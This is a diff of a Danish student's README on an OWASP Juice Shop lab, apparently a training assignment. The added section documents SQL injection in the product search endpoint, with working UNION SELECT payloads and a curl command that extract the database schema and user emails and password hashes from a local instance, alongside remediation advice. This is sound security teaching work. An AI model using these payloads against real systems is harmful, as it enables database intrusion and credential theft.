@@ -1,7 +1,7 @@
 # Opgave 5 – OWASP Juice Shop
 
-**Specialisterne Academy · 30. oktober 2026 (seneste statuskontrol)**  
-**Status:** Nyeste JSON-eksport fra 30. oktober 2026 viser **35/186** (**17 hacking-challenges + 9 Find It + 9 Fix It**).
+**Specialisterne Academy · 2. november 2026 (seneste dokumenterede resultater)**  
+**Status:** Seneste JSON-eksport fra 30. oktober 2026 viser **35/186**. Den 2. november blev **Database Schema** og **User Credentials** bekræftet løst med succesnotifikationer: dermed **mindst 37/186** (**19 hacking-challenges + 9 Find It + 9 Fix It**). Der foreligger endnu ikke en ny eksport med totalen.
 
 ## Formål
 
@@ -18,8 +18,9 @@ README'en kan bruges direkte som præsentation **uden live-demo**. Foreslået r�
 3. **Fund 1 (3 min):** Usikre sikkerhedsspørgsmål, fx OSINT om Jims Star Trek-reference → `Samuel` → **Forgot Password**-reset; Mortys hund **Snuffles/Snowball** og leetspeak som andet eksempel.
 4. **Fund 2 (2 min):** Tom brugerregistrering; vis `curl`-requesten og `HTTP/1.1 201 Created`.
 5. **Fund 3 (2 min):** Adresse-sletning → `HTTP 500`, SQLite/Sequelize-fejl og interne stier.
-6. **Andre erfaringer (1–2 min):** Steganografi, coding-challenges, forskel på challenge-status og faktisk udnyttet sårbarhed.
-7. **Konklusion (1 min):** Server-side inputvalidering, sikker password reset og fejlhåndtering; SOC-relevans.
+6. **Supplerende/alternativt fund (2–3 min):** SQL Injection i produktsøgningen med to dokumenterede trin: `sqlite_master` → `Users`; demonstrér datastrømmen uden at vise alle password-hashes.
+7. **Andre erfaringer (1 min):** Steganografi og forskel på at løse en challenge og at udnytte den tilsigtede sårbarhed.
+8. **Konklusion (1 min):** Parameteriserede forespørgsler, server-side adgangskontrol, sikker password reset og fejlhåndtering; SOC-relevans.
 
 **Præsentationsprincip:** Brug fundenes eksisterende kodeblokke som evidence. Spring den lange challenge-oversigt over, medmindre der bliver spurgt. En grøn challenge-markering beviser ikke nødvendigvis, at den tilsigtede angrebsmetode blev brugt.
 
@@ -55,29 +56,31 @@ Derefter blev `http://127.0.0.1:3000` åbnet lokalt. Denne fremgangsmåde kræve
 
 ## Resultat og status
 
-Seneste backup **`owasp_juice_shop-2026-10-30(1).json`** er afkodet med Juice Shops egne Hashids-salte og ID-liste. Den viser **35/186 løste deludfordringer:** **17 hacking-challenges** samt **9 Find It + 9 Fix It**. Dette er ni deludfordringer flere end eksporten tidligere samme dag (26/186). Denne status er baseret på eksportens indhold, ikke på et nyt Score Board-screenshot.
+Seneste backup **`owasp_juice_shop-2026-10-30(1).json`** blev afkodet med Juice Shops egne Hashids-salte og ID-liste og viste **35/186** (**17 hacking-challenges + 9 Find It + 9 Fix It**). Den **2. november 2026** blev yderligere to hacking-challenges (**Database Schema** og **User Credentials**) dokumenteret løst med grønne succesnotifikationer. Der er derfor **mindst 37/186 dokumenterede løste deludfordringer** (**19 hacking-challenges + 9 Find It + 9 Fix It**). Der er endnu ikke afkodet en ny eksport efter de to SQL Injection-fund.
 
 | Sværhedsgrad | Løst | Total |
 | --- | ---: | ---: |
 | 1 stjerne | 8 | 27 |
 | 2 stjerner | 2 | 29 |
-| 3 stjerner | 15 | 51 |
-| 4 stjerner | 7 | 40 |
+| 3 stjerner | 16 | 51 |
+| 4 stjerner | 8 | 40 |
 | 5 stjerner | 3 | 25 |
 | 6 stjerner | 0 | 14 |
-| **I alt** | **35** | **186** |
+| **I alt** | **37** | **186** |
 
-### Bekræftede løste hacking-challenges (17)
+### Bekræftede løste hacking-challenges (19)
 
 | Challenge | Stjerner | Juice Shop-kategori | Metode og begrænsning |
 | --- | ---: | --- | --- |
 | Bjoern's Favorite Pet | 3 | Broken Authentication | OSINT om Zaya og password reset |
 | Empty User Registration | 2 | Improper Input Validation | POST med tom e-mail og adgangskode → 201 |
 | Error Handling | 1 | Security Misconfiguration | Sletning af adresse → 500 med stack trace |
+| **Database Schema** | **3** | **Injection** | SQL Injection i produktsøgning: `UNION SELECT` hentede tabeldefinitioner fra `sqlite_master`; succesnotifikation 2. november |
 | **Login Bender** | **3** | **Injection** | Registreret som løst efter arbejde med Benders password-reset og konto; ingen SQL Injection mod login dokumenteret |
 | **Login Jim** | **3** | **Injection** | Opdaget efter Reset Jim's Password; normalt login med den nye adgangskode, ikke SQL Injection |
 | Privacy Policy | 1 | Miscellaneous | Account → Privacy & Security → Privacy Policy |
 | **Product Tampering** | **3** | **Broken Access Control** | Anonym `PUT /api/Products/9` ændrede den gemte produktbeskrivelse, HTTP 200; særskilt PoC nedenfor |
+| **User Credentials** | **4** | **Injection** | SQL Injection i samme søge-API hentede 25 brugerposter med e-mail og password-hash; succesnotifikation 2. november |
 | Repetitive Registration | 1 | Improper Input Validation | Løst med samme `curl` som Empty User Registration; `passwordRepeat` udeladt |
 | **Reset Bender's Password** | **4** | **Broken Authentication** | OSINT om Futurama-Benders arbejde med stålbjælker til Stop'n'Drop; anvendt ved Forgotten Password |
 | Reset Jim's Password | 3 | Broken Authentication | Starfleet-kommentar → James T. Kirk → broderens mellemnavn `Samuel` |
@@ -306,6 +309,90 @@ Den sårbare adfærd er direkte verificeret med `HTTP 200` og den ændrede produ
 
 ---
 
+## Sikkerhedsfund 5 – SQL Injection / Database Schema og User Credentials
+
+**Kategori:** Injection – SQL Injection (SQLite)  
+**Status:** To særskilte hacking-challenges bekræftet løst **2. november 2026** via Juice Shops grønne succesnotifikationer. `Find It` og `Fix It` for disse er **ikke** verificeret som løst.
+
+### Rekognoscering og forståelse af endpointet
+
+Efter at have gennemført tidligere coding challenges ville jeg afprøve **rigtig SQL Injection** og hente e-mailadresser, ikke kun identificere sårbar kode. Jeg begyndte med at overveje brugerinput som Customer Feedback og produktanmeldelser, men fokuserede derefter på **produktsøgningen**, hvor input indgår i databaseudtræk.
+
+Først forsøgte jeg en URL under Angular-frontenden `/#/search`. Derefter skiftede jeg til det faktiske REST-endpoint:
+
+```http
+GET /rest/products/search?q=...
+```
+
+Kilden `routes/search.ts` i OWASP Juice Shop konstruerer SQL med direkte interpolation af `q`:
+
+```javascript
+models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
+```
+
+Det er sårbart, fordi brugerinput indsættes i SQL **uden parameterbinding**. Test med en apostrof kan afsløre syntaksfejl; det næste trin var at lukke den oprindelige tekststreng og parenteserne og kommentere resten ud med `--`.
+
+### PoC 1 – udtræk af databaseskema
+
+Mit første forsøg brugte fejlagtigt `AND SELECT * FROM sqlite_master`. `AND` kræver en logisk betingelse, og `SELECT *` fra `sqlite_master` matcher ikke de 10 kolonner fra `Products`. Jeg korrigerede det til **`UNION SELECT` med 10 kolonner**:
+
+```sql
+')) UNION SELECT 1,2,3,sql,5,6,7,8,9,10 FROM sqlite_master--
+```
+
+Denne payload blev sendt som URL-parameter `q` direkte til `/rest/products/search`. Serveren returnerede `"status":"success"` og **22 `CREATE TABLE`-definitioner** sammen med de almindelige produktposter. I det injicerede resultatsæt ligger `sqlite_master.sql` i den **fjerde kolonne**, som produkt-API'et kalder `price`. Dermed kunne jeg blandt andet se hele definitionen af `Users`:
+
+```sql
+CREATE TABLE `Users` (
+  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
+  `username` VARCHAR(255) DEFAULT '',
+  `email` VARCHAR(255) UNIQUE,
+  `password` VARCHAR(255),
+  ...
+)
+```
+
+Juice Shop viste: **Database Schema – solved**.
+
+### PoC 2 – bruger-e-mails og password-hashes
+
+Med tabellen og kolonnerne identificeret kunne jeg lave en anden `UNION SELECT` mod `Users`:
+
+```bash
+curl -sG "http://127.0.0.1:3000/rest/products/search" \
+  --data-urlencode "q=')) UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM Users-- " \
+  | python3 -m json.tool
+```
+
+**Faktisk observeret:** `"status":"success"`; output indeholdt **25 rækker fra `Users`** samt de eksisterende produktposter. Felterne blev mappet efter kolonneposition:
+
+| Produkt-API-felt | Injiceret værdi |
+| --- | --- |
+| `id` | `Users.id` |
+| `name` | `Users.email` |
+| `description` | `Users.password` (MD5-hash) |
+| `price`, `deluxePrice`, m.fl. | Konstante pladsholdere (`4`, `5`, ...) |
+
+Eksempel fra den lokale lab (hash **bevidst udeladt fra det offentlige repository**):
+
+```json
+{"id":1,"name":"admin@juice-sh.op","description":"[MD5-hash udeladt]"}
+```
+
+Juice Shop viste: **User Credentials – solved**. Her blev SQL Injection faktisk **udnyttet til at læse data fra en anden tabel** – i modsætning til tidligere `Login Jim` og `Login Bender`, hvor de løste login-challenges ikke dokumenterer en SQL Injection.
+
+### Hvorfor er det en sårbarhed, og hvordan afhjælpes den?
+
+Et offentligt søgeendpoint kan læse tabeller, som brugere slet ikke burde have adgang til. `UNION SELECT` kombinerer resultater fra en anden tabel med produktresultatet, når kolonneantallet matcher. Databasen returnerer værdierne, og API'et serialiserer dem som produktfelter. **HTTP 200 og de faktisk returnerede brugerrækker** dokumenterer fortrolighedsbruddet i undervisningsmiljøet.
+
+**Afhjælpning:** Brug parameteriserede forespørgsler/bind-parametre frem for strenginterpolation; begræns databasekontoens privilegier; undlad detaljerede SQL-fejl til klienten; overvåg usædvanlige parametre såsom `UNION SELECT`, `sqlite_master` og gentagne syntaksfejl.
+
+**SOC-relevans:** Korreler HTTP-accesslogs, afvigende statuskoder, gentagne søgekald og store JSON-svar. Brug en lokal, anonymiseret PoC til demonstration og undgå at offentliggøre et komplet password-hash-udtræk.
+
+**Kildekode:** [OWASP Juice Shop: routes/search.ts](https://github.com/juice-shop/juice-shop/blob/master/routes/search.ts).
+
+---
+
 ## Øvrige undersøgelser og læringspunkter
 
 ### Recycling: client-side kontrol vs. server-side validering
@@ -378,6 +465,7 @@ Arbejdsgang:
 
 | Prioritet | Fund | Forslag | Verifikation |
 | --- | --- | --- | --- |
+| P1 | SQL Injection – produktsøgning | Parameteriseret SQL og mindst mulige DB-rettigheder | SQL-specialtegn behandles som data; `UNION SELECT` kan ikke hente tabeller |
 | P1 | Usikre sikkerhedsspørgsmål | Erstat med kortlivet, engangs-password-reset-link og rate limiting | OSINT-svar alene kan ikke nulstille konto |
 | P2 | Tom registrering | Server-side schema-validering og databaseconstraints | Tomme/udeladte felter giver 4xx, ikke 201 |
 | P3 | Fejllækage | Central fejlhåndtering og sikre responses | Constraint-fejl giver fx 409 uden stack trace |
@@ -398,12 +486,12 @@ Prioriteringen er en kvalitativ vurdering til undervisningsbrug, ikke en formel 
 
 - [x] Lokal, isoleret Juice Shop i Docker.
 - [x] Undersøgelse via browser, DevTools og direkte HTTP-requests.
-- [x] Fire særskilte sårbarhedsfund med observerede PoC-resultater, herunder Product Tampering fra 30. oktober.
+- [x] Fem særskilte sårbarhedsfund med observerede PoC-resultater, herunder Product Tampering 30. oktober og SQL Injection 2. november.
 - [x] Konkrete forslag til afhjælpning.
 - [x] Flere OSINT- og forensics-øvelser gennemført.
 - [ ] Gennemgå den faktiske kildekode og angiv konkrete filer/linjer for de tre hovedfund.
 - [ ] Tilføj **redigerede** screenshots af PoC, HTTP-responses og badges.
-- [x] Udfyld de 17 hacking-challenges og ni fuldførte coding challenges ud fra den nyeste Juice Shop-eksport.
+- [x] Dokumentér de 19 bekræftede hacking-challenges (17 fra eksport og to SQL Injection-resultater fra 2. november) samt ni fuldførte coding challenges fra seneste eksport.
 - [x] Lav præsentationsguide til 10–15 minutter med de tre fund; selve fremlæggelsen er ikke afholdt.
 - [ ] Valgfri patch eller regressionstest er **ikke** implementeret.
 
